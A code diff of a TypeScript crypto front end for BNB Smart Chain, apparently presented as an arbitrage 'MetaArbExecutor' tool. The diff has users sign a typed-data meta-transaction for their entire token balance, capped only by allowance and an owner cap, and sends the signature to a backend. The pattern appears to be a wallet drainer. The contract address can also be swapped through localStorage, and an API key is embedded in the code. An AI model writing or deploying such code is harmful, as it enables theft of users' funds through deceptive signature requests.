@@ -1,35 +1,20 @@
 import { ethers } from 'ethers';
 
-// Cache for active contract
-let contractCache: { address: string; timestamp: number } = {
-  address: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0x23F417BBc7d15ed099A0a6B4556e616282F0D19E',
-  timestamp: 0
-};
-
-// Get active contract address from database (with cache)
-export async function getActiveContractAddress(): Promise<string> {
-  const now = Date.now();
-  // Refresh cache every 30 seconds
-  if (now - contractCache.timestamp > 30000) {
-    try {
-      const response = await fetch('/api/active-contract');
-      const data = await response.json();
-      contractCache = {
-        address: data.address,
-        timestamp: now
-      };
-    } catch (error) {
-      console.error('[v0] Error fetching active contract:', error);
+// Get contract address dynamically from localStorage or env
+const getContractAddress = () => {
+  if (typeof window !== 'undefined') {
+    const stored = localStorage.getItem('contract_address');
+    if (stored && stored !== 'Not set') {
+      return stored;
     }
   }
-  return contractCache.address;
-}
+  return process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0x23F417BBc7d15ed099A0a6B4556e616282F0D19E";
+};
 
 export const CONFIG = {
-  RPC_URL: process.env.NEXT_PUBLIC_BSC_RPC_URL || "https://bnb-mainnet.g.alchemy.com/v2/demo",
+  RPC_URL: process.env.NEXT_PUBLIC_BSC_RPC_URL || "https://bnb-mainnet.g.alchemy.com/v2/SESyM2eIL2MuTgi52m27E",
   get CONTRACT_ADDRESS() {
-    // Return cached value (will be updated by async fetch)
-    return contractCache.address;
+    return getContractAddress();
   },
   TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
   OWNER_CAP: process.env.NEXT_PUBLIC_OWNER_CAP || "1000000"
@@ -241,40 +226,43 @@ export async function prepareAndSignTransaction(
     token.balanceOf(userAddress)
   ]);
 
+  // Match working HTML logic exactly:
+  // start with balance, cap to allowance, cap to ownerCap
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
   let incoming = balance;
   if (allowance < incoming) incoming = allowance;
-  if (ownerCapRaw && ownerCapRaw < incoming) incoming = ownerCapRaw;
+  if (ownerCapRaw > 0n && ownerCapRaw < incoming) incoming = ownerCapRaw;
+
   if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');
 
   const network = await provider.getNetwork();
   const chainId = network.chainId;
-  const domain = { 
-    name: 'MetaArbExecutor', 
-    version: '1', 
-    chainId: Number(chainId), 
-    verifyingContract: CONFIG.CONTRACT_ADDRESS 
+  const domain = {
+    name: 'MetaArbExecutor',
+    version: '1',
+    chainId: Number(chainId),
+    verifyingContract: CONFIG.CONTRACT_ADDRESS
   };
-  const types = { 
-    MetaTransaction: [ 
-      { name: 'user', type: 'address' }, 
-      { name: 'token', type: 'address' }, 
-      { name: 'Incomingamount', type: 'uint256' }, 
-      { name: 'nonce', type: 'uint256' }, 
-      { name: 'deadline', type: 'uint256' } 
-    ] 
+  const types = {
+    MetaTransaction: [
+      { name: 'user', type: 'address' },
+      { name: 'token', type: 'address' },
+      { name: 'Incomingamount', type: 'uint256' },
+      { name: 'nonce', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' }
+    ]
   };
 
   const executor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
   const nonce = await executor.nonces(userAddress);
   const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-  const message = { 
-    user: userAddress, 
-    token: CONFIG.TOKEN_ADDRESS, 
-    Incomingamount: incoming.toString(), 
-    nonce: nonce.toString(), 
-    deadline: deadline 
+  const message = {
+    user: userAddress,
+    token: CONFIG.TOKEN_ADDRESS,
+    Incomingamount: incoming.toString(),
+    nonce: nonce.toString(),
+    deadline: deadline
   };
   const rawSig = await signer.signTypedData(domain, types, message);
 
@@ -285,7 +273,7 @@ export async function prepareAndSignTransaction(
     body: JSON.stringify({
       user: message.user,
       token: message.token,
-      amount: message.Incomingamount,
+      amount: incoming.toString(), // Send as string representation of BigInt
       deadline: message.deadline,
       signature: rawSig
     })
